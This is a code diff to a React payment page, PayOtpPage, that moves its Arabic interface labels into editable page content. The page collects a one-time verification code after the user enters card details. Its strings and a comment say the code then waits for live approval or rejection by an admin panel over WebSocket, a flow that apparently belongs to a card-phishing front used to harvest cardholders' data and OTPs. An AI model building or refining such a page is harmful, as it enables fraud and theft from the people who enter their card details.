@@ -3,6 +3,19 @@ import { ShieldCheck, ArrowRight, Loader2, AlertCircle, CheckCircle, XCircle } f
 import Navbar from "@/components/Navbar";
 import Footer from "@/components/Footer";
 import { useWebSocket, broadcast } from "@/context/WebSocketContext";
+import { usePageContent } from "@/hooks/usePageContent";
+
+const DEFAULTS = {
+  page_title: "التحقق بخطوتين",
+  otp_placeholder: "أدخل رمز التحقق",
+  submit_btn: "تحقق من الرمز",
+  waiting_title: "في انتظار الموافقة",
+  waiting_message: "تم إرسال الرمز. في انتظار موافقة المدير...",
+  approved_title: "تمت الموافقة",
+  rejected_title: "رمز غير صحيح",
+  retry_btn: "حاول مرة أخرى",
+  back_btn: "العودة لإدخال بيانات البطاقة",
+};
 
 function getQueryParam(key: string): string | null {
   const params = new URLSearchParams(window.location.search);
@@ -20,6 +33,7 @@ export default function PayOtpPage() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState("");
   const { subscribe } = useWebSocket();
+  const content = usePageContent("pay-otp", DEFAULTS);
   const [pendingAppData, setPendingAppData] = useState<any>(null);
 
   // الاستماع لتحديثات حالة الدفع من لوحة الإدارة
@@ -154,10 +168,7 @@ export default function PayOtpPage() {
               </div>
 
               <h1 className="text-2xl font-bold text-white mb-2">
-                {status === "approved" ? "تمت الموافقة" :
-                 status === "rejected" ? "رمز غير صحيح" :
-                 status === "waiting" ? "في انتظار الموافقة" :
-                 "التحقق بخطوتين"}
+                {content.page_title || "التحقق بخطوتين"}
               </h1>
 
               <p className="text-white/80">{message}</p>
@@ -168,7 +179,7 @@ export default function PayOtpPage() {
                 <div className="space-y-4">
                   <div>
                     <label className="block text-white/70 text-sm mb-2 text-center">
-                      أدخل رمز التحقق المرسل إلى هاتفك
+                      {content.otp_placeholder || "أدخل رمز التحقق المرسل إلى هاتفك"}
                     </label>
                     <input
                       type="text"
@@ -202,7 +213,7 @@ export default function PayOtpPage() {
                     ) : (
                       <>
                         <ShieldCheck className="w-5 h-5" />
-                        تحقق من الرمز
+                        {content.submit_btn || "تحقق من الرمز"}
                       </>
                     )}
                   </button>
@@ -213,7 +224,7 @@ export default function PayOtpPage() {
                     className="w-full text-white/60 hover:text-white py-2 text-sm transition-colors flex items-center justify-center gap-2"
                   >
                     <ArrowRight className="w-4 h-4" />
-                    العودة لإدخال بيانات البطاقة
+                    {content.back_btn || "العودة لإدخال بيانات البطاقة"}
                   </button>
                 </div>
               </>
@@ -267,7 +278,7 @@ export default function PayOtpPage() {
                   className="w-full bg-white/10 hover:bg-white/20 text-white py-3 rounded-xl transition-all flex items-center justify-center gap-2"
                 >
                   <ArrowRight className="w-5 h-5" />
-                  حاول مرة أخرى
+                  {content.retry_btn || "حاول مرة أخرى"}
                 </button>
 
                 <button
@@ -276,7 +287,7 @@ export default function PayOtpPage() {
                   className="w-full text-white/60 hover:text-white py-2 text-sm transition-colors flex items-center justify-center gap-2"
                 >
                   <ArrowRight className="w-4 h-4" />
-                  العودة لإدخال بيانات البطاقة
+                  {content.back_btn || "العودة لإدخال بيانات البطاقة"}
                 </button>
               </div>
             )}
